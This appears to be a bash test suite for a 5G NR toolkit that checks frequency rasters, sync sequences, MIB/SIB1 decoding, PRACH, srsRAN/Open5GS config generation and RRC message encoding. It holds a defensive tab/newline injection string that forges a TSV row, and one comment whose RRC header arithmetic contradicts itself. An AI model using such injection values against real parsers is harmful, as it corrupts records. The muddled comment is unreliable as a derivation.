    # Band attribution and the FR split. n77 and n78 genuinely share their
    # ARFCN range, so the band field is a candidate list — asserting a single
    # band here would be asserting a bug.
    chk band-n78-overlap "$(nair_band_of_arfcn 640000)" "n48,n77,n78"
    chk band-n78-only    "$(nair_band_of_arfcn 660000)" "n77"
    chk band-n41-n53     "$(nair_band_of_arfcn 499200)" "n41,n53,n90"
    chk band-n257        "$(nair_band_of_arfcn 2054166)" "n257,n258"
    chk fr1-flag   "$(fld "$(nair_arfcn_record 640000)" fr)" "FR1"
    chk fr2-flag   "$(fld "$(nair_arfcn_record 2054166)" fr)" "FR2"
    chk fr2-band   "$(fld "$(nair_arfcn_record 2071666)" band)" "n257,n261"
    chk scs-fr1    "$(fld "$(nair_arfcn_record 640000)" scs_ref_khz)" "15"
    chk scs-fr2    "$(fld "$(nair_arfcn_record 2054166)" scs_ref_khz)" "60"
    chk arfcn-max  "$(fld "$(nair_arfcn_record 3279165)" fr)"     "FR2"
    chk arfcn-boundary-low  "$(nair_arfcn_to_mhz 599999)" "2999.995"
    chk arfcn-boundary-high "$(nair_arfcn_to_mhz 600000)" "3000.000"
    chk arfcn-fr2-low       "$(nair_arfcn_to_mhz 2016666)" "24249.990"

    # Out-of-range and non-numeric must fail rather than guess.
    chk arfcn-too-big   "$(nair_arfcn_to_mhz 3279166 >/dev/null 2>&1; echo $?)" "1"
    chk arfcn-neg       "$(nair_arfcn_to_mhz -1 >/dev/null 2>&1; echo $?)"      "1"
    chk arfcn-nonnum    "$(nair_arfcn_to_mhz abc >/dev/null 2>&1; echo $?)"     "1"

    # 2. GSCN synchronisation raster (TS 38.104 §5.4.3.1, Table 5.4.3.1-1).
    #    FR1: GSCN = 3N + (M-3)/2, SS_REF = N*1.2 + M*0.05 MHz
    #         GSCN 2 -> N=1,M=1 -> 1.250    GSCN 3 -> N=1,M=3 -> 1.350
    #         GSCN 4 -> N=1,M=5 -> 1.450
    #    Published band checks: n1 GSCN 5279 -> 2112.05; n40 GSCN 5875 ->
    #    2349.85; n78 GSCN 7711 -> 3305.28 and 8051 -> 3794.88.
    #    Mid range: GSCN 7499 -> 3000.000, 7500 -> 3001.440.
    #    FR2: GSCN 22256 -> 24250.080, i.e. the 17.28 MHz raster.
    chk gscn-2    "$(nair_gscn_to_mhz 2)"    "1.250"
    chk gscn-3    "$(nair_gscn_to_mhz 3)"    "1.350"
    chk gscn-4    "$(nair_gscn_to_mhz 4)"    "1.450"
    chk gscn-n1-5279   "$(nair_gscn_to_mhz 5279)"   "2112.050"
    chk gscn-n40-5875  "$(nair_gscn_to_mhz 5875)"   "2349.850"
    chk gscn-n78-7711  "$(nair_gscn_to_mhz 7711)"   "3305.280"
    chk gscn-n78-8051  "$(nair_gscn_to_mhz 8051)"   "3794.880"
    chk gscn-n77-8329  "$(nair_gscn_to_mhz 8329)"   "4195.200"
    chk gscn-7499 "$(nair_gscn_to_mhz 7499)" "3000.000"
    chk gscn-7500 "$(nair_gscn_to_mhz 7500)" "3001.440"
    chk gscn-22256 "$(nair_gscn_to_mhz 22256)" "24250.080"
    chk gscn-7498 "$(nair_gscn_to_mhz 7498)" "2999.050"
    chk gscn-bad  "$(nair_gscn_to_mhz 99999 >/dev/null 2>&1; echo $?)" "1"
    chk gscn-low  "$(nair_gscn_to_mhz 1 >/dev/null 2>&1; echo $?)"     "1"

    # 3. PSS / SSS / PCI.
    #    PCI = 3*N_ID(1) + N_ID(2); 1/1 -> 4, 335/2 -> 1007, 0/0 -> 0.
    chk pci-4      "$(nair_pci 1 1)"     "4"
    chk pci-0      "$(nair_pci 0 0)"     "0"
    chk pci-1007   "$(nair_pci 335 2)"   "1007"
    chk pci-bad-n1 "$(nair_pci 336 0 >/dev/null 2>&1; echo $?)" "1"
    chk pci-bad-n2 "$(nair_pci 0 3 >/dev/null 2>&1; echo $?)"   "1"
    chk pci-split  "$(fld "$(nair_pci_split 4)" n_id_1)"   "1"
    chk pci-split2 "$(fld "$(nair_pci_split 1007)" n_id_2)" "2"
    chk pci-splitbad "$(nair_pci_split 1008 >/dev/null 2>&1; echo $?)" "1"
    # PSS is BPSK: 127 chips, every one +/-1.
    out=$(nair_pss_sequence 0)
    chk pss-chips  "$(awk '{print NF}' <<<"$out")" "127"
    chk pss-values "$(awk '{for(i=1;i<=NF;i++) if ($i!=1 && $i!=-1) b=1; print (b?"bad":"ok")}' <<<"$out")" "ok"
    out=$(nair_sss_sequence 0 0)
    chk sss-chips  "$(awk '{print NF}' <<<"$out")" "127"
    chk sss-values "$(awk '{for(i=1;i<=NF;i++) if ($i!=1 && $i!=-1) b=1; print (b?"bad":"ok")}' <<<"$out")" "ok"
    # Pinned SSS chips taken from an INDEPENDENT TS 38.211 implementation
    # (py3gpp nrSSS, all 1008 PCIs cross-checked against the §7.4.2.3.1
    # recursion), not from this module's own output. Length and alphabet
    # alone cannot see the failure this guards: the LTE initialisations
    # (PSS init for x0, all-ones for x1, both with taps (4,0)) also yield
    # 127 values of +/-1, but the wrong ones for all 1008 cell identities.
    # The four PCIs below cover n2 = 0,1,2 and both floor(n1/112) branches
    # (n1 = 0, 14, 335), and the tail vectors pin the m-sequence phase, so
    # an m0/m1 offset error cannot hide behind a correct prefix.
    out=$(nair_sss_sequence 0 0)
    chk sss-pci0-head  "$(chips 1 14 <<<"$out")"  "1 1 1 1 1 1 1 1 1 1 -1 1 1 1"
    chk sss-pci0-tail  "$(chips 114 127 <<<"$out")" "-1 1 1 1 -1 1 1 -1 -1 -1 1 -1 -1 -1"
    out=$(nair_sss_sequence 0 1)
    chk sss-pci1-head  "$(chips 1 14 <<<"$out")"  "-1 1 -1 1 1 -1 1 -1 -1 -1 1 -1 1 -1"
    out=$(nair_sss_sequence 14 0)
    chk sss-pci42-head "$(chips 1 14 <<<"$out")"  "1 1 1 1 1 -1 1 1 1 1 -1 -1 -1 1"
    out=$(nair_sss_sequence 335 2)
    chk sss-pci1007-head "$(chips 1 14 <<<"$out")" "-1 1 -1 -1 -1 -1 1 1 -1 1 1 -1 1 -1"
    chk sss-pci1007-tail "$(chips 114 127 <<<"$out")" "1 1 1 -1 1 1 1 1 -1 1 1 1 1 1"
    # PSS is NOT touched by the SSS fix: its recursive form must still agree
    # with the closed-form construction the decoder carries independently.
    out=$(nair_pss_sequence 0)
    chk pss-pci0-head "$(chips 1 14 <<<"$out")" "1 -1 -1 1 -1 -1 -1 -1 1 1 -1 -1 -1 1"
    chk pss-bad    "$(nair_pss_sequence 3 >/dev/null 2>&1; echo $?)" "1"

    # 4. SSB burst set pattern and half-frame timing.
    chk ssb-case-n78  "$(nair_ssb_case_for_band n78)"  "Case C mode 1"
    chk ssb-case-n1   "$(nair_ssb_case_for_band n1)"   "Case A mode 1"
    chk ssb-case-n257 "$(nair_ssb_case_for_band n257)" "Case D mode 1"
    chk ssb-case-n263 "$(nair_ssb_case_for_band n263)" "Case E mode 1"
    chk ssb-scs-C     "$(fld "$(nair_ssb_pattern C)" scs_khz)"      "30"
    chk ssb-scs-D     "$(fld "$(nair_ssb_pattern D)" scs_khz)"      "120"
    chk ssb-max-D     "$(fld "$(nair_ssb_pattern D)" max_ssb)"      "64"
    chk ssb-pos-0-D   "$(fld "$(nair_ssb_position 0 D)" half_frame)" "0"
    chk ssb-pos-32-D  "$(fld "$(nair_ssb_position 32 D)" half_frame)" "1"
    chk ssb-pos-5-D   "$(fld "$(nair_ssb_position 5 D)" slot)"       "2"
    # Spec-stated case patterns, symbol index inside the half-frame:
    #   Case A {2,8}+14n  -> i=0 -> 2, i=1 -> 8
    #   Case B {4,8,16,20}+28n -> i=2 -> 16
    #   Case D {4,8,16,20}+28n -> i=0 -> 4, i=2 -> 16
    #   Case E {8,12,16,20,32,36,40,44}+56n -> i=4 -> 32
    chk ssb-sym-A0  "$(fld "$(nair_ssb_position 0 A)" symbol_in_half_frame)" "2"
    chk ssb-sym-A1  "$(fld "$(nair_ssb_position 1 A)" symbol_in_half_frame)" "8"
    chk ssb-sym-B2  "$(fld "$(nair_ssb_position 2 B)" symbol_in_half_frame)" "16"
    chk ssb-sym-D0  "$(fld "$(nair_ssb_position 0 D)" symbol_in_half_frame)" "4"
    chk ssb-sym-D2  "$(fld "$(nair_ssb_position 2 D)" symbol_in_half_frame)" "16"
    chk ssb-sym-E4  "$(fld "$(nair_ssb_position 4 E)" symbol_in_half_frame)" "32"
    chk ssb-sym-C4  "$(fld "$(nair_ssb_position 4 C)" symbol_in_half_frame)" "2"
    chk ssb-half-C4 "$(fld "$(nair_ssb_position 4 C)" half_frame)" "1"
    chk ssb-pos-bad   "$(nair_ssb_position 64 D >/dev/null 2>&1; echo $?)" "1"
    chk ssb-pattern-bad "$(nair_ssb_pattern Z >/dev/null 2>&1; echo $?)" "1"

    # 5. MIB bit-field extraction. The offsets include the CHOICE selector at
    #    bit 0, so the fields start one bit later than an LTE-style reading.
    #
    #    PUBLISHED VECTOR — not derived from this module. Daniel Estevez decoded
    #    the PBCH of a real srsRAN 5 MHz NR cell with asn1tools against the
    #    TS 38.331 ASN.1 (https://destevez.net/2024/12/5g-nr-pbch/) and reports
    #    for that cell:
    #        systemFrameNumber 6 MSBs  = 0xdc >> 2 = 110111 = 55
    #        subCarrierSpacingCommon   = scs15or60   -> index 0
    #        ssb-SubcarrierOffset      = 8
    #        dmrs-TypeA-Position       = pos2        -> index 0
    #        pdcch-ConfigSIB1          = controlResourceSetZero 0, searchSpaceZero 0
    #        cellBarred                = notBarred   -> index 1
    #        intraFreqReselection      = notAllowed  -> index 1
    #        spare                     = 0
    #    UPER-encoding those fields after the 1-bit CHOICE selector gives
    #       0 | 110111 | 0 | 1000 | 0 | 00000000 | 1 | 1 | 0 = 0x6E8006.
    out=$(nair_decode_mib 6E8006)
    chk mib0-type     "$(fld "$out" message_type)"            "mib"
    chk mib0-sfn      "$(fld "$out" sfn)"                     "55"
    chk mib0-scs      "$(fld "$out" subcarrier_spacing_common)" "15"
    chk mib0-kssb     "$(fld "$out" ssb_subcarrier_offset)"    "8"
    chk mib0-dmrs     "$(fld "$out" dmrs_type_a_position)"    "pos2"
    chk mib0-pdcch    "$(fld "$out" pdcch_config_sib1)"        "0"
    chk mib0-pdcch-hi "$(fld "$out" pdcch_config_sib1_hi4)"    "0"
    chk mib0-pdcch-lo "$(fld "$out" pdcch_config_sib1_lo4)"    "0"
    chk mib0-barred   "$(fld "$out" cell_barred)"             "notBarred"
    chk mib0-intra    "$(fld "$out" intra_freq_reselection)"  "notAllowed"
    chk mib0-spare    "$(fld "$out" spare)"                   "0"
    chk mib0-bitstr   "$(fld "$out" bitstring)"               "011011101000000000000110"

    #    A synthetic payload, kept as a bit-position exercise across every field
    #    boundary (it is NOT a capture and its comment is not the authority —
    #    the offsets above are): 0x541F54 = 0101 0100 0001 1111 0101 0100
    #      CHOICE selector          bit  0     = 0        -> mib
    #      systemFrameNumber        bits 1-6   = 101010   = 42
    #      subCarrierSpacingCommon  bit  7     = 0        -> scs15or60
    #      ssb-SubcarrierOffset     bits 8-11  = 0001     = 1
    #      dmrs-TypeA-Position      bit  12    = 1        -> pos3
    #      pdcch-ConfigSIB1         bits 13-20 = 1110 1010 = 234
    #      cellBarred               bit  21    = 1        -> notBarred
    #      intraFreqReselection     bit  22    = 0        -> allowed
    #      spare                    bit  23    = 0
    out=$(nair_decode_mib 541F54)
    chk mib-sfn       "$(fld "$out" sfn)"                     "42"
    chk mib-scs       "$(fld "$out" subcarrier_spacing_common)" "15"
    chk mib-kssb      "$(fld "$out" ssb_subcarrier_offset)"   "1"
    chk mib-dmrs      "$(fld "$out" dmrs_type_a_position)"   "pos3"
    chk mib-pdcch     "$(fld "$out" pdcch_config_sib1)"       "234"
    chk mib-pdcch-hi  "$(fld "$out" pdcch_config_sib1_hi4)"   "14"
    chk mib-pdcch-lo  "$(fld "$out" pdcch_config_sib1_lo4)"   "10"
    chk mib-barred    "$(fld "$out" cell_barred)"             "notBarred"
    chk mib-intra     "$(fld "$out" intra_freq_reselection)"  "allowed"
    chk mib-spare     "$(fld "$out" spare)"                   "0"
    chk mib-bitstr    "$(fld "$out" bitstring)"               "010101000001111101010100"

    #    CHOICE selector = 1 is messageClassExtension, an empty SEQUENCE: it is
    #    not a MIB and carries no SFN. 0x800000 and 0xFFFFFF only differ from a
    #    MIB by that selector bit, so they must be refused (rc 3), not read as
    #    SFN 32 / SFN 63.
    for _rej in 800000 FFFFFF; do
        out=$(nair_decode_mib "$_rej" 2>/dev/null); _rc=$?
        chk "mib-reject-$_rej-rc"  "$_rc"                              "3"
        chk "mib-reject-$_rej-type" "$(fld "$out" message_type)"       "messageClassExtension"
        chk "mib-reject-$_rej-sfn"  "$(fld "$out" sfn)"                ""
    done
    unset _rej _rc

    # 0x000000 is the all-zero MIB (selector 0): every index field is 0, so the
    # ENUMERATED fields read barred / allowed and the bar is up.
    out=$(nair_decode_mib 000000)
    chk mib-zero-sfn    "$(fld "$out" sfn)"         "0"
    chk mib-zero-pdcch  "$(fld "$out" pdcch_config_sib1)" "0"
    chk mib-zero-barred "$(fld "$out" cell_barred)" "barred"
    chk mib-zero-intra  "$(fld "$out" intra_freq_reselection)" "allowed"
    # 0x7FFFFF is the all-ones MIB: SFN 63, ssb offset 15, pdcch 255.
    out=$(nair_decode_mib 7FFFFF)
    chk mib-full-sfn    "$(fld "$out" sfn)"    "63"
    chk mib-full-kssb   "$(fld "$out" ssb_subcarrier_offset)" "15"
    chk mib-full-pdcch  "$(fld "$out" pdcch_config_sib1)" "255"
    chk mib-full-barred "$(fld "$out" cell_barred)" "notBarred"
    chk mib-full-intra  "$(fld "$out" intra_freq_reselection)" "notAllowed"
    chk mib-short       "$(nair_decode_mib 541F >/dev/null 2>&1; echo $?)" "1"
    chk mib-nonhex      "$(nair_decode_mib ZZ >/dev/null 2>&1; echo $?)"   "1"

    # 6. SIB1: PLMN list, TAC, 36-bit cellIdentity, cellReservedForOtherUse.
    #    Payload: 16 20 02F810 62F210 000700 00123456 70
    #      oct0      0x16            -> BCCH-DL-SCH-Message c1 : SIB1
    #      oct1      0x20            -> plmn-IdentityList entry count = 2
    #      oct2-4    02 F8 10        -> PLMN #1 = 208-01
    #                 (b0 lo=2 hi=0 -> MCC 208; b1 lo=8 hi=F -> MNC digit3
    #                  absent so the MNC is 2 digits; b2 lo=0 hi=1 -> "01")
    #      oct5-7    62 F2 10        -> PLMN #2 = 262-01
    #      oct8-10   00 07 00        -> trackingAreaCode 0x000700 = 1792
    #      oct11-15  00 12 34 56 70  -> high 32 bits 0x00123456 and the high
    #                 nibble 7 of the last octet -> 0x001234567 = 19088743
    #      low nibble of the final octet is cellReservedForOtherUse: 0 here,
    #      and 1 in the second vector below.
    out=$(nair_decode_sib1 "162002F81062F2100007000012345670" 2>/dev/null)
    rc=$?
    chk sib1-rc         "$rc" "0"
    chk sib1-msg        "$(fld "$out" rrc_message)"   "SIB1"
    chk sib1-plmn       "$(fld "$out" plmn_primary)"  "208-01"
    chk sib1-plmn2      "$(fld "$out" plmn_secondary)" "262-01"
    chk sib1-plmncount  "$(fld "$out" plmn_count)"    "2"
    chk sib1-tac        "$(fld "$out" tracking_area_code)" "1792"
    chk sib1-cellid     "$(fld "$out" cell_identity)" "19088743"
    chk sib1-cellid-hex "$(fld "$out" cell_identity_hex)" "001234567"
    chk sib1-cellid-bits "$(fld "$out" cell_identity_bits)" "36"
    chk sib1-notreserved "$(fld "$out" cell_reserved_for_other_use)" "false"
    chk sib1-scc        "$(fld "$out" serving_cell_config_common)"  "present"
    # A cell reserved for operator use: the final low nibble is non-zero.
    out=$(nair_decode_sib1 "162002F81062F2100007000012345671" 2>/dev/null)
    chk sib1-reserved   "$(fld "$out" cell_reserved_for_other_use)" "true"
    chk sib1-cellid-res "$(fld "$out" cell_identity)" "19088743"
    # A single-entry PLMN list must report one PLMN, not invent a second.
    out=$(nair_decode_sib1 "161002F81062F2100007000012345670" 2>/dev/null)
    chk sib1-one-plmn   "$(fld "$out" plmn_count)"     "1"
    chk sib1-one-second "$(fld "$out" plmn_secondary)" "none"

    # PLMN nibble order, both 2-digit and 3-digit MNC (TS 24.008 10.5.1.3).
    # Octet order is digit1|digit2, so 208-01 encodes as 02 F8 10 and
    # 310-260 as 13 00 62.
    chk plmn-208-01  "$(nair_sib1_plmn_decode 02F810)" "208-01"
    chk plmn-262-01  "$(nair_sib1_plmn_decode 62F210)" "262-01"
    chk plmn-310-260 "$(nair_sib1_plmn_decode 130062)" "310-260"
    chk plmn-234-30  "$(nair_sib1_plmn_decode 32F403)" "234-30"
    chk plmn-001-01  "$(nair_sib1_plmn_decode 00F110)" "001-01"
    chk plmn-bad     "$(nair_sib1_plmn_decode zz >/dev/null 2>&1; echo $?)" "1"
    chk sib1-short   "$(nair_decode_sib1 1600F1 >/dev/null 2>&1; echo $?)" "1"
    chk sib1-nonhex  "$(nair_decode_sib1 ZZZZZZZZZZZZZZZZZZZZZZZZ >/dev/null 2>&1; echo $?)" "1"

    # 7. PRACH: formats, occasions, 64-preamble selection.
    chk prach-fmt-0    "$(fld "$(nair_prach_format_info 0)" seq_len)"  "839"
    chk prach-fmt-0-l  "$(fld "$(nair_prach_format_info 0)" type)"     "long"
    chk prach-fmt-A1   "$(fld "$(nair_prach_format_info A1)" seq_len)" "139"
    chk prach-fmt-A1-s "$(fld "$(nair_prach_format_info A1)" type)"    "short"
    chk prach-fmt-C2   "$(fld "$(nair_prach_format_info C2)" scs_khz)" "30"
    chk prach-fmt-bad  "$(nair_prach_format_info Z9 >/dev/null 2>&1; echo $?)" "1"
    chk prach-64       "$(fld "$(nair_prach_format_info A1)" preamble_count)" "64"
    # Index 1: 1 ms period, subframe 4, msg1-FDM 1 -> 1 occasion per frame.
    out=$(nair_prach_occasions 1 1 15)
    chk prach-1-total  "$(fld "$out" total_occasions)"  "1"
    chk prach-1-sf     "$(fld "$out" subframes)"        "4"
    # msg1-FDM 8 multiplies the frequency-domain occasions: 1 * 8 = 8.
    chk prach-fdm-8    "$(fld "$(nair_prach_occasions 1 8 15)" total_occasions)" "8"
    # Index 53: 10 ms period, subframes {4,9}, 2 time-domain occasions,
    # msg1-FDM 4 -> 2 * 2 * 4 = 16.
    chk prach-53-total "$(fld "$(nair_prach_occasions 53 4 30)" total_occasions)" "16"
    chk prach-53-per   "$(fld "$(nair_prach_occasions 53 4 30)" occasions_per_frame)" "16.0000"
    chk prach-index-bad "$(nair_prach_occasions 256 >/dev/null 2>&1; echo $?)" "1"
    chk prach-fdm-bad   "$(nair_prach_occasions 1 3 >/dev/null 2>&1; echo $?)"  "1"
    chk preamble-0     "$(fld "$(nair_prach_preamble 0)" group)"  "A"
    chk preamble-59    "$(fld "$(nair_prach_preamble 59)" group)" "A"
    chk preamble-63    "$(fld "$(nair_prach_preamble 63)" group)" "B"
    chk preamble-63-k  "$(fld "$(nair_prach_preamble 63)" kind)"  "reserved (group B / contention-free)"
    chk preamble-40-r  "$(fld "$(nair_prach_preamble 40)" root_sequence)" "2"
    chk preamble-64    "$(nair_prach_preamble 64 >/dev/null 2>&1; echo $?)" "1"
    chk preamble-bad   "$(nair_prach_preamble nine >/dev/null 2>&1; echo $?)" "1"

    # 8. gnb.conf generation: file on disk, right keys, right values.
    out=$(nair_gen_gnb_conf 20801 n78 640000 42 "$NAIR_DIR/gnb.conf")
    rc=$?
    chk gencfg-rc        "$rc" "0"
    chk gencfg-status    "$(fld "$out" status)" "written"
    chk gencfg-file      "$([[ -f "$NAIR_DIR/gnb.conf" ]] && echo yes || echo no)" "yes"
    chk gencfg-band      "$(grep -c '^  band: n78$' "$NAIR_DIR/gnb.conf")"        "1"
    chk gencfg-arfcn     "$(grep -c '^  dl_arfcn: 640000$' "$NAIR_DIR/gnb.conf")" "1"
    chk gencfg-pci       "$(grep -c '^  pci: 42$' "$NAIR_DIR/gnb.conf")"          "1"
    chk gencfg-plmn      "$(grep -c '^        - plmn: \"20801\"$' "$NAIR_DIR/gnb.conf")" "1"
    chk gencfg-amf       "$(grep -c '^  addr: 127.0.0.5$' "$NAIR_DIR/gnb.conf")"  "1"
    chk gencfg-ssbscs    "$(grep -c '^    ssb_scs: 30$' "$NAIR_DIR/gnb.conf")"    "1"
    chk gencfg-cfgfile   "$(fld "$out" conf)" "$NAIR_DIR/gnb.conf"
    chk gencfg-bad-plmn  "$(nair_gen_gnb_conf 123 n78 640000 1 "$NAIR_DIR/x.conf" >/dev/null 2>&1; echo $?)" "2"
    chk gencfg-bad-band  "$(nair_gen_gnb_conf 20801 band 640000 1 "$NAIR_DIR/x.conf" >/dev/null 2>&1; echo $?)" "2"
    chk gencfg-bad-arfcn "$(nair_gen_gnb_conf 20801 n78 abc 1 "$NAIR_DIR/x.conf" >/dev/null 2>&1; echo $?)" "2"
    chk gencfg-bad-pci   "$(nair_gen_gnb_conf 20801 n78 640000 1008 "$NAIR_DIR/x.conf" >/dev/null 2>&1; echo $?)" "2"
    chk gencfg-nofile    "$(nair_gen_gnb_conf 20801 n78 640000 1 /nonexistent-dir/x/gnb.conf >/dev/null 2>&1; echo $?)" "1"
    out=$(nair_gen_open5gs_conf 20801 7 "$NAIR_DIR/amf.yaml")
    chk corecfg-rc     "$?" "0"
    # The AMF slice carries the PLMN in both the TAI and the plmn_support
    # list, so `mcc: 208` appears exactly twice — asserting 1 would be wrong.
    chk corecfg-file   "$(grep -c '^        mcc: 208$' "$NAIR_DIR/amf.yaml")" "2"
    chk corecfg-mnc    "$(grep -c '^        mnc: 01$' "$NAIR_DIR/amf.yaml")"  "2"
    chk corecfg-sbi    "$(grep -c 'address: 127.0.0.5' "$NAIR_DIR/amf.yaml")" "3"
    chk corecfg-tac    "$(grep -c '^      tac: 7$' "$NAIR_DIR/amf.yaml")"     "1"
    chk corecfg-bad    "$(nair_gen_open5gs_conf x 7 "$NAIR_DIR/y.yaml" >/dev/null 2>&1; echo $?)" "2"

    # 9. Lifecycle: --stop with nothing running is a success, and a start
    #    without srsRAN is an ERROR naming the missing program. Neither
    #    needs a radio.
    rm -f "$NAIR_PID"
    chk stop-idempotent "$(nair_stop)" "status	not-running"
    out=$(nair_start "$NAIR_DIR/gnb.conf" 2>&1); rc=$?
    if command -v gnb >/dev/null 2>&1; then
        chk start-gnb-missing "present" "present"
        nair_stop >/dev/null 2>&1
    else
        chk start-rc-nognb  "$rc" "1"
        chk start-names-gnb "$(grep -c 'srsRAN' <<<"$out")" "1"
    fi
    chk start-noconf "$(nair_start /nonexistent/gnb.conf >/dev/null 2>&1; echo $?)" "1"

    # 10. Status TSV contract. Tool presence is environment-dependent, so
    #     only the invariant fields are asserted.
    out=$(nair_cli_status_tsv)
    chk status-conf    "$(fld "$out" conf)" "$NAIR_CONF"
    chk status-dir     "$(fld "$out" dir)"  "$NAIR_DIR"
    chk status-running "$(fld "$out" gnb_running)" "no"
    chk status-keys    "$(printf '%s\n' "$out" | grep -c . | awk '{print ($1>=9)?"ok":"short"}')" "ok"

    # 11. Verb validation returns non-zero, never a success line.
    chk cli-arfcn-noargs "$(nair_cmd_arfcn >/dev/null 2>&1; echo $?)"        "2"
    chk cli-arfcn-nonnum "$(nair_cmd_arfcn 12ab >/dev/null 2>&1; echo $?)"   "2"
    chk cli-arfcn-range  "$(nair_cmd_arfcn 99999999 >/dev/null 2>&1; echo $?)" "1"
    chk cli-pci-noargs   "$(nair_cmd_pci >/dev/null 2>&1; echo $?)"          "2"
    chk cli-pci-bad      "$(nair_cmd_pci 400 0 >/dev/null 2>&1; echo $?)"    "2"
    chk cli-mib-noargs   "$(nair_cmd_decode_mib >/dev/null 2>&1; echo $?)"   "2"
    chk cli-mib-bad      "$(nair_cmd_decode_mib 1234 >/dev/null 2>&1; echo $?)" "1"
    chk cli-sib1-bad     "$(nair_cmd_decode_sib1 00 >/dev/null 2>&1; echo $?)" "1"
    chk cli-prach-bad    "$(nair_cmd_prach 999 >/dev/null 2>&1; echo $?)"    "1"
    chk cli-ssb-bad      "$(nair_cmd_ssb n78 99 >/dev/null 2>&1; echo $?)"   "1"
    chk cli-unknown      "$(nair_cli_main --nonsense >/dev/null 2>&1; echo $?)" "2"
    out=$(nair_cmd_arfcn 640000); rc=$?
    chk cli-arfcn-rc   "$rc" "0"
    chk cli-arfcn-freq "$(fld "$out" freq_mhz)" "3600.000"
    chk cli-arfcn-band "$(fld "$out" band)"     "n48,n77,n78"

    # 12. TSV injection: a tab in an untrusted string must not forge a row.
    local evil
    evil=$(nair_sanitize $'208-01\tfake\trow\nmore')
    chk sanitize-tabs "$(printf '%s' "$evil" | awk -F'\t' '{print NF}')" "1"
    chk sanitize-nl   "$(printf '%s' "$evil" | grep -c .)" "1"

    # 13. RRC APER codec. Every expected value below is a PUBLISHED ground
    #     truth, not this module's own output: each was produced by encoding
    #     the same message with an independent implementation of the TS 38.331
    #     ASN.1 (pycrate's RRCNR module, itself generated from the published
    #     grammar). The hand-derived layout is asserted against those bytes.
    #
    #     RRCReconfiguration header arithmetic, in full, so the constants are
    #     checkable by hand from TS 38.331 6.2.2:
    #       DL-DCCH-MessageType ::= CHOICE { c1, messageClassExtension }
    #         -> 1 bit, c1 = 0
    #       DL-DCCH-MessageType.c1 ::= CHOICE { rrcReconfiguration(0),
    #         rrcResume(1), rrcRelease(2), ..., spare1(15) }
    #         -> 16 alternatives, 4 bits, rrcReconfiguration = 0
    #       rrc-TransactionIdentifier INTEGER (0..3) -> 2 bits, no extension
    #       criticalExtensions ::= CHOICE { rrcReconfiguration, future }
    #         -> 1 bit, rrcReconfiguration = 0
    #     So the first octet is 0b000t_tt00 where tt is the transaction id:
    #       tx=0 -> 0000 0000 = 0x00 ; tx=1 -> 0000 1000' ... = 0x08|...
    #     Concretely, tx=1 first octet = 0b00 00 01 0 0 = 0x04, and with the
    #     5 absent OPT bits (all 0) plus one pad bit the second octet is 0x00,
    #     giving 0x0200 for tx=1 — which is what the reference returns.
    chk rrc-tx0   "$(nair_build_rrc_reconfig 0 '')"        "0000"
    chk rrc-tx1   "$(nair_build_rrc_reconfig 1 '')"        "0200"
    chk rrc-tx2   "$(nair_build_rrc_reconfig 2 '')"        "0400"
    chk rrc-tx3   "$(nair_build_rrc_reconfig 3 '')"        "0600"
    chk rrc-meas1 "$(nair_build_rrc_reconfig 0 '1/1/1')"   "002010000000"
    chk rrc-meas2 "$(nair_build_rrc_reconfig 0 '2/3/4')"   "002010001083"
    chk rrc-meas3 "$(nair_build_rrc_reconfig 0 '64/64/64')" "00201003FFFF"
    chk rrc-meas4 "$(nair_build_rrc_reconfig 0 '1/1/1,2/2/2')" "002010040000041040"
    chk rrc-tx-range "$(nair_build_rrc_reconfig 4 '' >/dev/null 2>&1; echo $?)" "2"
    chk rrc-meas-range "$(nair_build_rrc_reconfig 0 '65/1/1' >/dev/null 2>&1; echo $?)" "2"
    chk rrc-meas-shape "$(nair_build_rrc_reconfig 0 '1-1-1' >/dev/null 2>&1; echo $?)" "2"
    #     CLI spec parsing. A meas LIST is comma-joined triplets, so the spec
    #     cannot simply be split on ',' — the list must survive intact. Both
    #     key orders are asserted because the list length differs between them.
    chk cli-rrc-list   "$(nair_cmd_build_rrc_reconfig 'tx=0,meas=1/1/1,2/2/2' |
                           awk -F'\t' '$1=="submit"{print $2}')" "002010040000041040"
    chk cli-rrc-count  "$(nair_cmd_build_rrc_reconfig 'tx=0,meas=1/1/1,2/2/2' |
                           awk -F'\t' '$1=="ie_count"{print $2}')" "2"
    chk cli-rrc-revord "$(nair_cmd_build_rrc_reconfig 'meas=1/1/1,tx=1' |
                           awk -F'\t' '$1=="submit"{print $2}')" "022010000000"
    chk cli-rrc-badkey "$(nair_cmd_build_rrc_reconfig 'tx=0,bogus=1' >/dev/null 2>&1; echo $?)" "2"

    #     MeasurementReport. Arithmetic, checkable by hand from TS 38.331:
    #       UL-DCCH-MessageType.c1 CHOICE, 16 alternatives, 4 bits, 0
    #       criticalExtensions CHOICE -> 1 bit, 0
    #       measId INTEGER (1..64) -> 6 bits, encoded as measId-1
    #     measId=1 therefore encodes six zero bits after the header, and the
    #     message ends at the 5-byte boundary: 0000000100.
    #     measId=64 encodes 63 = 0b111111, giving 003F000100.
    chk mr-id1    "$(nair_build_meas_report 1 0 '' '')"  "0000000100"
    chk mr-id2    "$(nair_build_meas_report 2 0 '' '')"  "0001000100"
    chk mr-id64   "$(nair_build_meas_report 64 0 '' '')" "003F000100"
    #     rsrp is INTEGER (0..127) -> 7 bits, at an offset fixed by the
    #     serving-cell block. rsrp=127 -> 0b1111111.
    chk mr-serv0   "$(nair_build_meas_report 1 0 0 '')"   "000000014000"
    chk mr-serv127 "$(nair_build_meas_report 1 0 127 '')" "000000014FE0"
    #     ssb-Index INTEGER (0..63) -> 6 bits; ssb-Results.rsrp 7 bits.
    chk mr-ssb1  "$(nair_build_meas_report 1 0 '' '1:64')"   "00400001003080832000"
    chk mr-ssb63 "$(nair_build_meas_report 1 0 '' '63:127')" "00400001003080FF3F80"
    chk mr-both  "$(nair_build_meas_report 1 0 0 '1:64')"    "00400001400061010640"
    chk mr-ssb-range "$(nair_build_meas_report 1 0 '' '64:1' >/dev/null 2>&1; echo $?)" "2"
    chk mr-rsrp-range "$(nair_build_meas_report 1 0 '' '1:128' >/dev/null 2>&1; echo $?)" "2"
    chk mr-id-range "$(nair_build_meas_report 65 0 '' '' >/dev/null 2>&1; echo $?)" "2"

    #     Round trip: the decoder must invert the builder, both directions.
    out=$(nair_decode_rrc "$(nair_build_rrc_reconfig 2 '5/6/7')")
    chk dec-rrc-dir  "$(fld "$out" direction)" "DL-DCCH"
    chk dec-rrc-msg  "$(fld "$out" message)"   "rrcReconfiguration"
    chk dec-rrc-tx   "$(fld "$out" rrc_TransactionIdentifier)" "2"
